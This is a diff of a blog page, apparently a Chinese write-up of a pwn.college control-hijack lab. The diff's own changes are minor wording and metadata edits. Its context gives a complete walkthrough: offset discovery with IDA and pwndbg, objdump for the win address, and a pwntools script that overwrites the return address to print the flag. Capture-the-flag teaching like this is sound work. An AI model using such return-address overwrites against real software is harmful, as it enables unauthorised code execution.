@@ -36,7 +36,7 @@
 <meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/Control-Hijack/objdump.png">
 <meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/Control-Hijack/flag.png">
 <meta property="article:published_time" content="2025-07-19T01:01:37.000Z">
-<meta property="article:modified_time" content="2025-07-21T05:57:19.182Z">
+<meta property="article:modified_time" content="2025-07-21T06:03:12.461Z">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/Control-Hijack/main.png">
   
@@ -219,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          573 words
+          575 words
         
       </span>
     
@@ -279,7 +279,7 @@
 <p>如下图，发现只开了NX<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/checksec.png" srcset="/img/loading.gif" lazyload><br>说明不能往栈上写shellcode<br><br>同时，观察左侧函数名一栏存在一个win函数，点进去看一下，发现是输出flag的功能，如图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/win.png" srcset="/img/loading.gif" lazyload><br>至此，漏洞点就清晰了，我们需要覆盖返回地址为win函数的地址，劫持challenge函数的控制流</p>
 <h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先需要确定缓冲区到返回地址的偏移，记录两种方法：<br><br>第一个是通过IDA，注意challenge函数反编译的截图，在第5行buf变量后面有一个[rbp-80H]的字段，联系栈帧结构，可以知道返回地址在缓冲区的高0x80+0x8&#x3D;136字节处<br><br>第二个是通过gdb的pwndbg插件：<br><br>首先在gdb中运行反汇编命令，拿到challenge函数的ret指令的地址<br></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">disas challenge<br></code></pre></td></tr></table></figure>
-<p><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/pwndbg-1.png" srcset="/img/loading.gif" lazyload><br>可以看到在challenge函数+289位置，那么就在ret处打上断点，<br><br>通过cyclic生成模式字符串，将该字符串作为输入，如图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/pwndbg-2.png" srcset="/img/loading.gif" lazyload><br>最后通过cyclic -l命令，查找rsp指向的字符串的偏移，即是返回地址的偏移<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/pwndbg-3.png" srcset="/img/loading.gif" lazyload><br>之后确定win函数地址，由于没有开启PIE，可以采用objdump命令进行反汇编，直接拿到win的地址<br></p>
+<p><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/pwndbg-1.png" srcset="/img/loading.gif" lazyload><br>可以看到在challenge函数+289位置，那么就在ret处打上断点<br><br>之后通过cyclic生成模式字符串，将该字符串作为输入，如下图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/pwndbg-2.png" srcset="/img/loading.gif" lazyload><br>最后通过cyclic -l命令，查找rsp指向的字符串的偏移，即是返回地址的偏移<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/pwndbg-3.png" srcset="/img/loading.gif" lazyload><br>之后确定win函数地址，由于没有开启PIE，可以采用objdump命令进行反汇编，直接拿到win的地址<br></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">objdump -d /challenge/binary-exploitation-control-hijack<br></code></pre></td></tr></table></figure>
 <p><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/objdump.png" srcset="/img/loading.gif" lazyload><br>可以看到win函数在0x401c20的地方<br><br>因此可以编写出如下利用脚本了<br></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>ioHandler=process(<span class="hljs-string">&quot;/challenge/binary-exploitation-control-hijack&quot;</span>)<br>offset=<span class="hljs-number">136</span><br>winAddr=<span class="hljs-number">0x401c20</span><br>ioHandler.recvuntil(<span class="hljs-string">&quot;Send your payload (up to 4096 bytes)!\n&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(winAddr)<br>ioHandler.send(payload)<br>flag=ioHandler.recvall().decode()<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
